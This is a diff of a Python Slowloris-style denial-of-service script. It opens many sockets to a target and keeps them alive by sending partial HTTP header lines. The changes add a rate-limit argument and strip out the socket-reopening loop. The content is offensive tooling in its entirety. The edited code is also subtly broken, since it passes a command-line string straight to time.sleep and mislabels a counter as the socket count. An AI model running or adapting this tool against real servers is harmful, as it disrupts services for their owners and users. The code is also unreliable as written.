@@ -21,8 +21,8 @@ def setupSocket(ip):
     return sock
 
 if __name__ == "__main__":
-    if len(sys.argv) != 2:
-        print("usage: python3 {} example.com".format(sys.argv[0]))
+    if len(sys.argv) != 3:
+        print("usage: python3 {} example.com ratelimit".format(sys.argv[0]))
         sys.exit()
 
     ip = sys.argv[1]
@@ -34,28 +34,22 @@ if __name__ == "__main__":
             print("Socket " + str(i))
             sock = setupSocket(ip)
         except socket.error:
-            print("error 520! socket doesn't connect")
+            print("error! socket doesn't connect")
             break
 
         sockets.append(sock)
 
+    send = 0
+    limit = sys.argv[2]
+
     while True:
-        print("Connected to {} sockets. Sending headers...".format(len(sockets)))
+        print("Connected to {} sockets. Sending headers...".format(send))
+        send += 1
 
         for sock in list(sockets):
             try:
                 sock.send("X-a: {}\r\n".format(random.randint(1, 4600)).encode("utf-8"))
             except socket.error:
                 sockets.remove(sock)
-
-        for _ in range(count - len(sockets)):
-            print("Re-opening closed sockets...")
-            try:
-                sock = setupSocket(ip)
-                if sock:
-                    sockets.append(sock)
-            except socket.error:
-                print("error 520! socket doesn't connect")
-                break
-
-        time.sleep(3)
+                
+        time.sleep(limit)
